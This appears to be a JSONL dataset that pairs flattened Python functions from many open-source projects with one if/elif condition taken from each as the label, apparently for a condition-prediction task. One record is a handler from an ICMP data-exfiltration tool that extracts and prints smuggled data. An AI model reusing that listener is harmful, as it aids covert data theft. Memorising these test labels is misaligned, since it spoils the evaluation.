{"input": "def ref_max_pooling_3d(x, kernel, stride, ignore_border, pad): y = [] for xx in x.reshape((-1,) + x.shape[-4:]): if xx.ndim == 3: xx = xx[np.newaxis] y += [ refs.pooling_3d(xx, \"max\", kernel, stride, pad, ignore_border)[np.newaxis] ] y = np.vstack(y) if x.ndim == 3: y = np.squeeze(y, 1) return y.reshape(x.shape[:-4] + y.shape[1:])", "label": "if xx . ndim == 3 :"}
{"input": "def reader_(): with open(file_list) as flist: lines = [line.strip() for line in flist] if shuffle: random.shuffle(lines) for line in lines: file_path = line.strip() yield [file_path]", "label": "if shuffle :"}
{"input": "def _sql_like_to_regex(pattern, escape): cur_i = 0 pattern_length = len(pattern) while cur_i < pattern_length: nxt_i = cur_i + 1 cur = pattern[cur_i] nxt = pattern[nxt_i] if nxt_i < pattern_length else None skip = 1 if nxt is not None and escape is not None and cur == escape: yield nxt skip = 2 elif cur == \"%\": yield \".*\" elif cur == \"_\": yield \".\" else: yield cur cur_i += skip", "label": "elif cur == \"_\" :"}
{"input": "def gaussian(N=1000, draw=True, show=True, seed=42, color=None, marker=\"sphere\"): \"\"\"Show N random gaussian distributed points using a scatter plot.\"\"\" import ipyvolume as ipv rng = np.random.RandomState(seed) # pylint: disable=no-member x, y, z = rng.normal(size=(3, N)) if draw: if color: mesh = ipv.scatter(x, y, z, marker=marker, color=color) else: mesh = ipv.scatter(x, y, z, marker=marker) if show: # ipv.squarelim() ipv.show() return mesh else: return x, y, z", "label": "if color :"}
{"input": "def _delete_keys(bucket, keys): for name in keys: while True: try: k = boto.s3.connection.Key(bucket, name) bucket.delete_key(k) except boto.exception.S3ResponseError as e: if e.status == 404: # Key is already not present. Continue the # deletion iteration. break raise else: break", "label": "if e . status == 404 :"}
{"input": "def detect(self): hardware = self.middleware.call_sync(\"failover.hardware\") if hardware == \"ECHOSTREAM\": proc = subprocess.check_output( '/usr/sbin/pciconf -lv | grep \"card=0xa01f8086 chip=0x10d38086\"', shell=True, encoding=\"utf8\", ) if proc: return [proc.split(\"@\")[0]] if hardware in (\"ECHOWARP\", \"PUMA\"): return [\"ntb0\"] if hardware == \"BHYVE\": return [\"vtnet1\"] if hardware == \"SBB\": return [\"ix0\"] if hardware == \"ULTIMATE\": return [\"igb1\"] return []", "label": "if proc :"}
{"input": "def check_config(param): fileopen = open(\"/etc/setoolkit/set.config\", \"r\") for line in fileopen: line = line.rstrip() # print line # if the line starts with the param we want then we are set, otherwise # if it starts with a # then ignore if line.startswith(param) != \"#\": if line.startswith(param): line = line.rstrip() # remove any quotes or single quotes line = line.replace('\"', \"\") line = line.replace(\"'\", \"\") line = line.split(\"=\", 1) return line[1]", "label": "if line . startswith ( param ) :"}
{"input": "def put(self, s): \"\"\"Put string s to self.outputFile. All output eventually comes here.\"\"\" # Improved code: self.outputFile (a cStringIO object) always exists. if s: self.putCount += 1 if not g.isPython3: s = g.toEncodedString(s, self.leo_file_encoding, reportErrors=True) self.outputFile.write(s)", "label": "if not g . isPython3 :"}
{"input": "def get_system_prop_font(self): \"\"\"Look up the system font\"\"\" if self.system_prop_font is not None: return self.system_prop_font elif \"org.gnome.desktop.interface\" not in Gio.Settings.list_schemas(): return else: gsettings = Gio.Settings.new(\"org.gnome.desktop.interface\") value = gsettings.get_value(\"font-name\") if value: self.system_prop_font = value.get_string() else: self.system_prop_font = \"Sans 10\" return self.system_prop_font", "label": "if value :"}
{"input": "def _setoct(self, octstring): \"\"\"Reset the bitstring to have the value given in octstring.\"\"\" octstring = tidy_input_string(octstring) # remove any 0o if present octstring = octstring.replace(\"0o\", \"\") binlist = [] for i in octstring: try: if not 0 <= int(i) < 8: raise ValueError binlist.append(OCT_TO_BITS[int(i)]) except ValueError: raise CreationError(\"Invalid symbol '{0}' in oct initialiser.\", i) self._setbin_unsafe(\"\".join(binlist))", "label": "if not 0 <= int ( i ) < 8 :"}
{"input": "def group(self, resources): groups = {} for r in resources: v = self._value_to_sort(self.group_by, r) vstr = str(v) if vstr not in groups: groups[vstr] = {\"sortkey\": v, \"resources\": []} groups[vstr][\"resources\"].append(r) return groups", "label": "if vstr not in groups :"}
{"input": "def rd(line_number, row, col, key, default=None): \"\"\"Return Row data by column name\"\"\" if key in col: if col[key] >= len(row): LOG.warning(\"missing '%s, on line %d\" % (key, line_number)) return default retval = row[col[key]].strip() if retval == \"\": return default else: return retval else: return default", "label": "if retval == \"\" :"}
{"input": "def _run(self): while True: tup = self._pop() if tup is None: return method_name, kwargs, msg = tup try: super(SerializedInvoker, self).invoke(method_name, kwargs, msg) except mitogen.core.CallError: e = sys.exc_info()[1] LOG.warning(\"%r: call error: %s: %s\", self, msg, e) msg.reply(e) except Exception: LOG.exception(\"%r: while invoking %s()\", self, method_name) msg.reply(mitogen.core.Message.dead())", "label": "if tup is None :"}
{"input": "def raises(except_cls, message=None): try: yield success = False except except_cls as e: if message: assert re.search(message, compat.text_type(e), re.UNICODE), \"%r !~ %s\" % ( message, e, ) print(compat.text_type(e).encode(\"utf-8\")) success = True # assert outside the block so it works for AssertionError too ! assert success, \"Callable did not raise an exception\"", "label": "if message :"}
{"input": "def buttonClicked(self, button): role = self.buttonBox.buttonRole(button) if role == QDialogButtonBox.ResetRole: current_tab = self.tabwidget.currentWidget() section_to_update = Sections.ALL if current_tab is self.page_general: section_to_update = Sections.GENERAL if current_tab is self.page_display: section_to_update = Sections.DISPLAY self.resetToDefaults(section_to_update)", "label": "if current_tab is self . page_display :"}
{"input": "def make_range_list(*values): ranges = [] for v in values: if isinstance(v, int): val_node = plural.value_node(v) ranges.append((val_node, val_node)) else: assert isinstance(v, tuple) ranges.append((plural.value_node(v[0]), plural.value_node(v[1]))) return plural.range_list_node(ranges)", "label": "if isinstance ( v , int ) :"}
{"input": "def __in_comment(self): if self.highlighter: current_color = self.__get_current_color() comment_color = self.highlighter.get_color_name(\"comment\") if current_color == comment_color: return True else: return False else: return False", "label": "if current_color == comment_color :"}
{"input": "def __str__(self): \"\"\"Constructs to variable list output used in cron jobs\"\"\" ret = [] for key, value in self.items(): if self.previous: if self.previous.all().get(key, None) == value: continue if \" \" in unicode(value) or value == \"\": value = '\"%s\"' % value ret.append(\"%s=%s\" % (key, unicode(value))) ret.append(\"\") return \"\\n\".join(ret)", "label": "if \" \" in unicode ( value ) or value == \"\" :"}
{"input": "def _on_config_changed(changed_name: str) -> None: \"\"\"Call config_changed hooks if the config changed.\"\"\" for mod_info in _module_infos: if mod_info.skip_hooks: continue for option, hook in mod_info.config_changed_hooks: if option is None: hook() else: cfilter = config.change_filter(option) cfilter.validate() if cfilter.check_match(changed_name): hook()", "label": "if cfilter . check_match ( changed_name ) :"}
{"input": "def __init__(self, transcripts, vocab=None, unknown=None, *args, **kwargs): \"\"\"Creates a new raw transcript source.\"\"\" super().__init__(*args, **kwargs) self.transcripts = transcripts self.indices = numpy.arange(len(self)) self.vocab = self.make_vocab(vocab) if unknown is None: self.unknown = self.unknown_index = None else: self.unknown_index = self.vocab.get(unknown) if self.unknown_index is None: raise ValueError( 'The \"unknown\" vocabulary word must be ' \"part of the vocabulary itself.\" ) self.unknown = unknown", "label": "if self . unknown_index is None :"}
{"input": "def load_info(cls, path, reset_paths=False, load_model_if_required=True): load_path = path + cls.trainer_info_name try: return load_pkl.load(path=load_path) except: if load_model_if_required: trainer = cls.load(path=path, reset_paths=reset_paths) return trainer.get_info() else: raise", "label": "if load_model_if_required :"}
{"input": "def createActions(actions, target): # actions = [(name, shortcut, icon, desc, func)] for name, shortcut, icon, desc, func in actions: action = QAction(target) if icon: action.setIcon(icon) if shortcut: action.setShortcut(shortcut) action.setText(desc) action.triggered.connect(func) setattr(target, name, action)", "label": "if icon :"}
{"input": "def load_user_logins(self, key, dates, timestamps, size_threshold=None): date_bucket = {} for user_data in self.fetch_user_table(): if size_threshold is not None and user_data[1] < size_threshold: continue # note: ts should already be utc! dt = datetime.fromtimestamp(user_data[6] / 1000) dt = dt.date().isoformat() date_bucket[dt] = date_bucket.get(dt, 0) + 1 datapoints = [] for dt, ts in zip(dates, timestamps): count = date_bucket.get(dt, 0) datapoints.append((count, ts)) return {\"target\": key, \"datapoints\": datapoints}", "label": "if size_threshold is not None and user_data [ 1 ] < size_threshold :"}
{"input": "def apply_batch(it): batch = [] for item in it: if isinstance(item, _NextValueNotReady): yield item else: batch.append(item) if len(batch) >= n: yield batch batch = [] if batch: yield batch", "label": "if isinstance ( item , _NextValueNotReady ) :"}
{"input": "def convert_tomlkit_table(section): if isinstance(section, tomlkit.items.Table): body = section.value._body else: body = section._body for key, value in body: if not key: continue if hasattr(value, \"keys\") and not isinstance(value, tomlkit.items.InlineTable): table = tomlkit.inline_table() table.update(value.value) section[key.key] = table", "label": "if hasattr ( value , \"keys\" ) and not isinstance ( value , tomlkit . items . InlineTable ) :"}
{"input": "def _do_ssl_handshake(self): try: self.socket.do_handshake() except ssl.SSLError as err: if err.args[0] in (ssl.SSL_ERROR_WANT_READ, ssl.SSL_ERROR_WANT_WRITE): return elif err.args[0] == ssl.SSL_ERROR_EOF: return self.handle_close() raise except OSError as err: if err.args[0] == errno.ECONNABORTED: return self.handle_close() else: self._ssl_accepting = False", "label": "elif err . args [ 0 ] == ssl . SSL_ERROR_EOF :"}
{"input": "def get_filechanges(repo, revision, parents, mleft): \"\"\"Given some repository and revision, find all changed/deleted files.\"\"\" l, c, r = [], [], [] for p in parents: if p < 0: continue mright = revsymbol(repo, b\"%d\" % p).manifest() l, c, r = split_dict(mleft, mright, l, c, r) l.sort() c.sort() r.sort() return l, c, r", "label": "if p < 0 :"}
{"input": "def close_share(self, share_name): c = await run( [SMBCmd.SMBCONTROL.value, \"smbd\", \"close-share\", share_name], check=False ) if c.returncode != 0: if \"Can't find pid\" in c.stderr.decode(): # smbd is not running. Don't log error message. return self.logger.warn( \"Failed to close smb share [%s]: [%s]\", share_name, c.stderr.decode().strip(), )", "label": "if \"Can't find pid\" in c . stderr . decode ( ) :"}
{"input": "def execute(self, context): if self.tree_name: ng = bpy.data.node_groups.get(self.tree_name) if ng: apply_theme(ng) else: return {\"CANCELLED\"} else: apply_theme() return {\"FINISHED\"}", "label": "if ng :"}
{"input": "def apply(self, db, object): if not self.source_handle: if self.nosource: # check whether the citation list is empty as a proxy for # there being no sources return len(object.get_all_citation_lists()) == 0 else: return False else: for citation_handle in object.get_all_citation_lists(): citation = db.get_citation_from_handle(citation_handle) if citation.get_reference_handle() == self.source_handle: return True return False", "label": "if self . nosource :"}
{"input": "def get_data_dir(): \"\"\"Get the directory path for flit user data files.\"\"\" home = os.path.realpath(os.path.expanduser(\"~\")) if sys.platform == \"darwin\": d = Path(home, \"Library\") elif os.name == \"nt\": appdata = os.environ.get(\"APPDATA\", None) if appdata: d = Path(appdata) else: d = Path(home, \"AppData\", \"Roaming\") else: # Linux, non-OS X Unix, AIX, etc. xdg = os.environ.get(\"XDG_DATA_HOME\", None) d = Path(xdg) if xdg else Path(home, \".local/share\") return d / \"flit\"", "label": "if appdata :"}
{"input": "def wait_for_service(name, timeout=200): start = time.time() while True: status = win32serviceutil.QueryServiceStatus(name) if status[1] == win32service.SERVICE_STOPPED: break if time.time() - start > timeout: raise TimeoutError( \"Timeout waiting for service\" ) # pylint: disable=undefined-variable time.sleep(0.3)", "label": "if time . time ( ) - start > timeout :"}
{"input": "def get_selection(self): if self.uistate[\"selection\"] == \"all\": return AllPages(self.notebook) else: path = self.uistate[\"selected_page\"] if self.uistate[\"selection_recursive\"]: return SubPages(self.notebook, path) else: return SinglePage(self.notebook, path)", "label": "if self . uistate [ \"selection_recursive\" ] :"}
{"input": "def test_repeated_edges(self): graph_size = 20 for _ in range(20): graph = Graph.graph(graph_size, int(graph_size * 2), repeated_edges=True) edges = [(e.start, e.end) for e in graph.iterate_edges()] has_repeated_edges = len(edges) > len(set(edges)) if has_repeated_edges: break self.assertTrue(has_repeated_edges) for _ in range(10): graph = Graph.graph(graph_size, int(graph_size * 2), repeated_edges=False) edges = list(graph.iterate_edges()) self.assertEqual(len(edges), len(set(edges)))", "label": "if has_repeated_edges :"}
{"input": "def cs(self): \"\"\"ConfigSpace representation of this search space.\"\"\" cs = CS.ConfigurationSpace() for k, v in self.kwvars.items(): if isinstance(v, NestedSpace): _add_cs(cs, v.cs, k) elif isinstance(v, Space): hp = v.get_hp(name=k) _add_hp(cs, hp) else: _rm_hp(cs, k) return cs", "label": "if isinstance ( v , NestedSpace ) :"}
{"input": "def packet_handler(Packet): global add_new_line if Packet.haslayer(ICMP): Data = Packet.getlayer(ICMP).getlayer(Raw) exfiltrated_data = Data.load[int(exfiltration_length) :].replace( exfiltration_length * \"\\n\", \"\\n\" ) if exfiltrated_data.endswith(\"\\n\"): add_new_line = False sys.stdout.write(exfiltrated_data) sys.stdout.flush()", "label": "if exfiltrated_data . endswith ( \"\\n\" ) :"}
{"input": "def acquire(self, *, wait=False): if not wait and self.value <= 0: # signal that we're not acquiring return False while self.value <= 0: future = self.loop.create_future() self._waiters.append(future) try: await future except: future.cancel() if self.value > 0 and not future.cancelled(): self.wake_up() raise self.value -= 1 return True", "label": "if self . value > 0 and not future . cancelled ( ) :"}
{"input": "def handle_events(self, events): for event in events: if event == WindowEvent.SCREEN_RECORDING_TOGGLE: self.recording ^= True if not self.recording: self.save() else: logger.info(\"ScreenRecorder started\") break return events", "label": "if event == WindowEvent . SCREEN_RECORDING_TOGGLE :"}
{"input": "def _register_for_operations(config, session, service_name): # There's certainly a tradeoff for registering the retry config # for the operations when the service is created. In practice, # there aren't a whole lot of per operation retry configs so # this is ok for now. for key in config: if key == \"__default__\": continue handler = retryhandler.create_retry_handler(config, key) unique_id = \"retry-config-%s-%s\" % (service_name, key) session.register( \"needs-retry.%s.%s\" % (service_name, key), handler, unique_id=unique_id )", "label": "if key == \"__default__\" :"}
{"input": "def showTicks(self, show=True): for tick in self.ticks.keys(): if show: tick.show() orig = getattr(self, \"_allowAdd_backup\", None) if orig: self.allowAdd = orig else: self._allowAdd_backup = self.allowAdd self.allowAdd = False # block tick creation tick.hide()", "label": "if orig :"}
{"input": "def _has_cycle(self, node, visited, visit_stack): self.last_visited_node = node self.path.append(node) visited[node] = True visit_stack[node] = True for neighbor in self.graph[node]: if not visited[neighbor]: if self._has_cycle(neighbor, visited, visit_stack): return True elif visit_stack[neighbor]: self.path.append(neighbor) return True self.path.remove(node) visit_stack[node] = False return False", "label": "if self . _has_cycle ( neighbor , visited , visit_stack ) :"}
{"input": "def get_project_list(exclude_default=False): \"\"\"get_project_list - get list of all projects\"\"\" projects_path = __project__.get_projects_path() project_list = [] if os.path.exists(projects_path): for project in os.listdir(projects_path): project_path = os.path.join(projects_path, project) if os.path.isdir(project_path): project_list.append(project) if exclude_default: pass else: project_list.append(\"default\") return sorted(project_list)", "label": "if os . path . isdir ( project_path ) :"}
{"input": "def split(self, chunksize): modulus_map = { 4: 256, 5: 10, 8: 100, } chunks, ip = self.preprocess(chunksize) ret = \"\" for i in range(len(chunks)): ip_part = compat_str(ip[i] % modulus_map[chunksize]) if i < 4 else \"\" if chunksize == 8: ret += ip_part + chunks[i] else: ret += chunks[i] + ip_part self.target = ret", "label": "if chunksize == 8 :"}
{"input": "def DepsToModules(deps, prefix, suffix): modules = [] for filepath in deps: filename = os.path.basename(filepath) if filename.startswith(prefix) and filename.endswith(suffix): modules.append(filename[len(prefix) : -len(suffix)]) return modules", "label": "if filename . startswith ( prefix ) and filename . endswith ( suffix ) :"}
{"input": "def listdir(path): path = path.rstrip(\"/\") + \"/\" dir_set, file_set = set(), set() for p in files.keys(): if not p.startswith(path): continue parts = p[len(path) :].split(\"/\") if len(parts) == 1: file_set.add(parts[0]) else: dir_set.add(parts[0]) return sorted(dir_set), sorted(file_set)", "label": "if not p . startswith ( path ) :"}
{"input": "def read_series(rec): found = [] for tag in (\"440\", \"490\", \"830\"): fields = rec.get_fields(tag) if not fields: continue for f in fields: this = [] for k, v in f.get_subfields([\"a\", \"v\"]): if k == \"v\" and v: this.append(v) continue v = v.rstrip(\".,; \") if v: this.append(v) if this: found += [\" -- \".join(this)] return found", "label": "if not fields :"}
{"input": "def find_nameless_urls(self, conf): nameless = [] patterns = self.get_patterns(conf) for u in patterns: if self.has_patterns(u): nameless.extend(self.find_nameless_urls(u)) else: if u.name is None: nameless.append(u) return nameless", "label": "if self . has_patterns ( u ) :"}
{"input": "def update_billing_status(self, update_modified=True): updated_pr = [self.name] for d in self.get(\"items\"): if d.purchase_order_item: updated_pr += update_billed_amount_based_on_po( d.purchase_order_item, update_modified ) for pr in set(updated_pr): pr_doc = self if (pr == self.name) else frappe.get_doc(\"Purchase Receipt\", pr) update_billing_percentage(pr_doc, update_modified=update_modified) self.load_from_db()", "label": "if d . purchase_order_item :"}
{"input": "def _get_version(): with open(\"haiku/__init__.py\") as fp: for line in fp: if line.startswith(\"__version__\"): g = {} exec(line, g) # pylint: disable=exec-used return g[\"__version__\"] raise ValueError(\"`__version__` not defined in `haiku/__init__.py`\")", "label": "if line . startswith ( \"__version__\" ) :"}
{"input": "def GetSelected(self): if self.GetStyleL(\"style\") & self.Style.LBS_MULTIPLESEL: result = self.SendMessage(self.Hwnd, self.Msg.LB_GETSELCOUNT, 0, 0) if result: return self.SendMessage(self.Hwnd, self.Msg.LB_GETANCHORINDEX, 0, 0) else: result = self.SendMessage(self.Hwnd, self.Msg.LB_GETCURSEL, 0, 0) if result != LB_ERR: return result", "label": "if result != LB_ERR :"}
{"input": "def __init__(self, column_names, column_types, **kwargs): super().__init__(**kwargs) self.column_names = column_names self.column_types = column_types encoding = [] for column_name in self.column_names: column_type = self.column_types[column_name] if column_type == analysers.CATEGORICAL: # TODO: Search to use one-hot or int. encoding.append(keras_layers.INT) else: encoding.append(keras_layers.NONE) self.layer = keras_layers.MultiCategoryEncoding(encoding)", "label": "if column_type == analysers . CATEGORICAL :"}
{"input": "def rotate(cls, axis, theta): \"\"\"Prepare a quaternion that represents a rotation on a given axis.\"\"\" if isinstance(axis, str): if axis in (\"x\", \"X\"): axis = V.X elif axis in (\"y\", \"Y\"): axis = V.Y elif axis in (\"z\", \"Z\"): axis = V.Z axis = axis.normalize() s = math.sin(theta / 2.0) c = math.cos(theta / 2.0) return Q(axis._v[0] * s, axis._v[1] * s, axis._v[2] * s, c)", "label": "if axis in ( \"x\" , \"X\" ) :"}
{"input": "def log(self, request): web_socket = WebSocketResponse() await web_socket.prepare(request) self.app[\"websockets\"].add(web_socket) try: async for msg in web_socket: if msg.type == WSMsgType.TEXT: if msg.data == \"close\": await web_socket.close() elif msg.type == WSMsgType.ERROR: print( \"web socket connection closed with exception %s\" % web_socket.exception() ) finally: self.app[\"websockets\"].remove(web_socket) return web_socket", "label": "if msg . data == \"close\" :"}
{"input": "def test_loc_is_stochastic_parameter(self): param = iap.Laplace(iap.Choice([-100, 100]), 1) seen = [0, 0] for _ in sm.xrange(1000): samples = param.draw_samples((100,)) exp = np.mean(samples) if -100 - 10 < exp < -100 + 10: seen[0] += 1 elif 100 - 10 < exp < 100 + 10: seen[1] += 1 else: assert False assert 500 - 100 < seen[0] < 500 + 100 assert 500 - 100 < seen[1] < 500 + 100", "label": "if - 100 - 10 < exp < - 100 + 10 :"}
{"input": "def cli_setup(args=None): \"\"\"future api for setup env by cli\"\"\" if not args: if len(sys.argv) < 2: print(\"no cmdline args\") return False args = sys.argv print(args) ap = argparse.ArgumentParser() if \"--report\" in args: from airtest.report.report import main as report_main ap = report_parser(ap) args = ap.parse_args(args) report_main(args) exit(0) else: ap = runner_parser(ap) args = ap.parse_args(args) setup_by_args(args) return True", "label": "if len ( sys . argv ) < 2 :"}
{"input": "def validate_attributes(cls, cleaned_data): errors = {} for field in [\"product_attributes\", \"variant_attributes\"]: attributes = cleaned_data.get(field) if not attributes: continue not_valid_attributes = [ graphene.Node.to_global_id(\"Attribute\", attr.pk) for attr in attributes if attr.type != AttributeType.PRODUCT_TYPE ] if not_valid_attributes: errors[field] = ValidationError( \"Only Product type attributes are allowed.\", code=ProductErrorCode.INVALID.value, params={\"attributes\": not_valid_attributes}, ) if errors: raise ValidationError(errors)", "label": "if not_valid_attributes :"}
{"input": "def forward(self, x, activate=True, norm=True): for layer in self.order: if layer == \"conv\": if self.with_explicit_padding: x = self.padding_layer(x) x = self.conv(x) elif layer == \"norm\" and norm and self.with_norm: x = self.norm(x) elif layer == \"act\" and activate and self.with_activation: x = self.activate(x) return x", "label": "elif layer == \"norm\" and norm and self . with_norm :"}
{"input": "def _FunctionDef(self, node): _ScopeVisitor._FunctionDef(self, node) if len(node.args.args) > 0: first = node.args.args[0] if isinstance(first, ast.Name): new_visitor = _ClassInitVisitor(self, first.id) for child in ast.get_child_nodes(node): ast.walk(child, new_visitor)", "label": "if isinstance ( first , ast . Name ) :"}
{"input": "def result(self): \"\"\"Gets the formatted string result.\"\"\" if self.__group.isChecked(): if self.__moreThan.isChecked(): return \"gt%d\" % self.__min.value() if self.__lessThan.isChecked(): return \"lt%d\" % self.__max.value() if self.__range.isChecked(): return \"%d-%d\" % (self.__min.value(), self.__max.value()) return \"\"", "label": "if self . __lessThan . isChecked ( ) :"}
{"input": "def hash_of_file(path): \"\"\"Return the hash of a downloaded file.\"\"\" with open(path, \"rb\") as archive: sha = sha256() while True: data = archive.read(2 ** 20) if not data: break sha.update(data) return encoded_hash(sha)", "label": "if not data :"}
{"input": "def read_boolean(file: BinaryIO, count: int, checkall: bool = False) -> List[bool]: if checkall: all_defined = file.read(1) if all_defined != unhexlify(\"00\"): return [True] * count result = [] b = 0 mask = 0 for i in range(count): if mask == 0: b = ord(file.read(1)) mask = 0x80 result.append(b & mask != 0) mask >>= 1 return result", "label": "if all_defined != unhexlify ( \"00\" ) :"}
{"input": "def start_prompt(self): \"\"\"Start the interpreter.\"\"\" logger.show(\"Coconut Interpreter:\") logger.show(\"(type 'exit()' or press Ctrl-D to end)\") self.start_running() while self.running: try: code = self.get_input() if code: compiled = self.handle_input(code) if compiled: self.execute(compiled, use_eval=None) except KeyboardInterrupt: printerr(\"\\nKeyboardInterrupt\")", "label": "if code :"}
{"input": "def _wrap_lineanchors(self, inner): s = self.lineanchors i = self.linenostart - 1 # subtract 1 since we have to increment i # *before* yielding for t, line in inner: if t: i += 1 yield 1, '<a name=\"%s-%d\"></a>' % (s, i) + line else: yield 0, line", "label": "if t :"}
{"input": "def __UpdateQueryHistory(self, query): clone = datastore_pb.Query() clone.CopyFrom(query) clone.clear_hint() clone.clear_limit() clone.clear_offset() clone.clear_count() if clone in self.__query_history: self.__query_history[clone] += 1 else: self.__query_history[clone] = 1 if clone.app() == self._app_id: self.__query_ci_history.add(datastore_index.CompositeIndexForQuery(clone))", "label": "if clone . app ( ) == self . _app_id :"}
{"input": "def call(self, trajectory: traj.Trajectory): if not self._batch_size: if trajectory.step_type.ndim == 0: self._batch_size = 1 else: assert trajectory.step_type.ndim == 1 self._batch_size = trajectory.step_type.shape[0] self.reset() if trajectory.step_type.ndim == 0: trajectory = nest_utils.batch_nested_array(trajectory) self._batched_call(trajectory)", "label": "if trajectory . step_type . ndim == 0 :"}
{"input": "def steps(self): \"\"\"\"\"\" for step_id in range(self.micro_batches): cmds = [ LoadMicroBatch(buffer_id=0), ForwardPass(buffer_id=0), BackwardPass(buffer_id=0), ] if step_id == self.micro_batches - 1: cmds.extend( [ ReduceGrads(), OptimizerStep(), ] ) yield cmds", "label": "if step_id == self . micro_batches - 1 :"}
{"input": "def resolve_project(self, workspace, project_name): if isinstance(project_name, (int, float)): # project id project_id = int(project_name) self.log.debug(\"Treating project name as ID: %s\", project_id) project = workspace.projects(ident=project_id).first() if not project: raise TaurusConfigError( \"BlazeMeter project not found by ID: %s\" % project_id ) elif project_name: project = workspace.projects(name=project_name).first() else: project = None if not project: project = self._create_project_or_use_default(workspace, project_name) return project", "label": "if not project :"}
{"input": "def __reader(self, collector, source): while True: data = os.read(source.fileno(), 65536) self.__lock.acquire() collector.append(data) self.__lock.release() if data == \"\": source.close() break return", "label": "if data == \"\" :"}
{"input": "def add(self, undoinfo, msg=None): if not undoinfo: return if msg is not None: if isinstance(undoinfo[0], str): # replace message undoinfo = (msg,) + undoinfo[1:] elif isinstance(undoinfo, tuple): undoinfo = (msg,) + undoinfo else: undoinfo = (msg, undoinfo) f = 1 else: f = int(isinstance(undoinfo[0], str)) assert ( isinstance(undoinfo, list) or callable(undoinfo[f]) or isinstance(undoinfo[f], list) ) self.undoList.append(undoinfo) del self.redoList[:]", "label": "elif isinstance ( undoinfo , tuple ) :"}
{"input": "def get_history_data(self, guid, count=1): history = {} if count < 1: return history key = self._make_key(guid) for i in range(0, self.db.llen(key)): r = self.db.lindex(key, i) c = msgpack.unpackb(r) if c[\"tries\"] == 0 or c[\"tries\"] is None: if c[\"data\"] not in history: history[c[\"data\"]] = c[\"timestamp\"] if len(history) >= count: break return history", "label": "if len ( history ) >= count :"}
{"input": "def __str__(self): from sqlalchemy.sql import util details = [SQLAlchemyError.__str__(self)] if self.statement: details.append(\"[SQL: %r]\" % self.statement) if self.params: params_repr = util._repr_params(self.params, 10) details.append(\"[parameters: %r]\" % params_repr) return \" \".join([\"(%s)\" % det for det in self.detail] + details)", "label": "if self . params :"}
{"input": "def _consume_msg(self): async for data in self._stream: stream = data.get(\"ev\") if stream: await self._dispatch(data) elif data.get(\"status\") == \"disconnected\": # Polygon returns this on an empty 'ev' id.. data[\"ev\"] = \"status\" await self._dispatch(data) raise ConnectionResetError( \"Polygon terminated connection: \" f'({data.get(\"message\")})' )", "label": "if stream :"}
{"input": "def nan2none(l): for idx, val in enumerate(l): if isinstance(val, Sequence): l[idx] = nan2none(l[idx]) elif isnum(val) and math.isnan(val): l[idx] = None return l", "label": "elif isnum ( val ) and math . isnan ( val ) :"}
{"input": "def _make_binary_stream(s, encoding): try: if _py3k: if isinstance(s, str): s = s.encode(encoding) else: if type(s) is not str: s = s.encode(encoding) from io import BytesIO rv = BytesIO(s) except ImportError: rv = StringIO(s) return rv", "label": "if type ( s ) is not str :"}
{"input": "def __set__(self, instance, value): try: value = int(value) if 0 <= value <= 65535: # max port number is 65535 self.display_value = str(value) self.value = value else: raise PocsuiteValidationException( \"Invalid option. Port value should be between 0 and 65536.\" ) except ValueError: raise PocsuiteValidationException( \"Invalid option. Cannot cast '{}' to integer.\".format(value) )", "label": "if 0 <= value <= 65535 :"}
{"input": "def addVaXref(self, va, parent=None): if parent is None: parent = self xtova, ok = QInputDialog.getText(parent, \"Enter...\", \"Make Code Xref 0x%x -> \" % va) if ok: try: val = self.vw.parseExpression(str(xtova)) if self.vw.isValidPointer(val): self.vw.addXref(va, val, REF_CODE) else: self.vw.vprint(\"Invalid Expression: %s (%s)\" % (xtova, val)) except Exception as e: self.vw.vprint(repr(e))", "label": "if self . vw . isValidPointer ( val ) :"}
{"input": "def ArrayBuffer(): a = arguments[0] if isinstance(a, PyJsNumber): length = a.to_uint32() if length != a.value: raise MakeError(\"RangeError\", \"Invalid array length\") temp = Js(bytearray([0] * length)) return temp return Js(bytearray([0]))", "label": "if length != a . value :"}
{"input": "def _update_positions(nodes, line_offset, last_leaf): for node in nodes: try: children = node.children except AttributeError: # Is a leaf node.line += line_offset if node is last_leaf: raise _PositionUpdatingFinished else: _update_positions(children, line_offset, last_leaf)", "label": "if node is last_leaf :"}
{"input": "def class_has_method(self, curr_node, the_text): try: class_node = self.containers[VAR_KIND_CLASS][-1] for c in class_node.children: if isinstance(c, MethodNode) and c.name == the_text: return True except: pass return False", "label": "if isinstance ( c , MethodNode ) and c . name == the_text :"}
{"input": "def _fm(map_id): for i in range(num_key): for j in range(num_value_per_key): if dup_key: yield (i, j) else: yield ((map_id, i), j)", "label": "if dup_key :"}
{"input": "def _compileRules(rulesList, maxLength=4): ruleChecking = collections.defaultdict(list) for ruleIndex in range(len(rulesList)): args = [] if len(rulesList[ruleIndex]) == maxLength: args = rulesList[ruleIndex][-1] if maxLength == 4: (shouldRunMethod, method, isCorrect) = rulesList[ruleIndex][0:3] ruleChecking[shouldRunMethod].append((method, isCorrect, args)) elif maxLength == 3: (shouldRunMethod, method) = rulesList[ruleIndex][0:2] ruleChecking[shouldRunMethod].append((method, args)) return ruleChecking", "label": "elif maxLength == 3 :"}
{"input": "def select(result): for elem in result: parent = elem.getparent() if parent is None: continue try: # FIXME: what if the selector is \"*\" ? elems = list(parent.iterchildren(elem.tag)) if elems[index] is elem: yield elem except IndexError: pass", "label": "if elems [ index ] is elem :"}
{"input": "def get_kwarg_or_param(request, kwargs, key): value = None try: value = kwargs[key] except KeyError: if request.method == \"GET\": value = request.GET.get(key) elif request.method == \"POST\": value = request.POST.get(key) return value", "label": "if request . method == \"GET\" :"}
{"input": "def __imul__(self, other): if isinstance(other, str): other = Matrix(other) if isinstance(other, Matrix): if self.start is not None: self.start *= other if self.control1 is not None: self.control1 *= other if self.control2 is not None: self.control2 *= other if self.end is not None: self.end *= other return self", "label": "if self . control1 is not None :"}
{"input": "def _parse_date_fmt(): fmt = get_format(\"DATE_FORMAT\") escaped = False for char in fmt: if escaped: escaped = False elif char == \"\\\\\": escaped = True elif char in \"Yy\": yield \"year\" elif char in \"bEFMmNn\": yield \"month\" elif char in \"dj\": yield \"day\"", "label": "elif char in \"Yy\" :"}
{"input": "def filter_forms(forms): result = [] seen = set() for form in forms: if form in self._lemma_pos_offset_map: if pos in self._lemma_pos_offset_map[form]: if form not in seen: result.append(form) seen.add(form) return result", "label": "if form in self . _lemma_pos_offset_map :"}
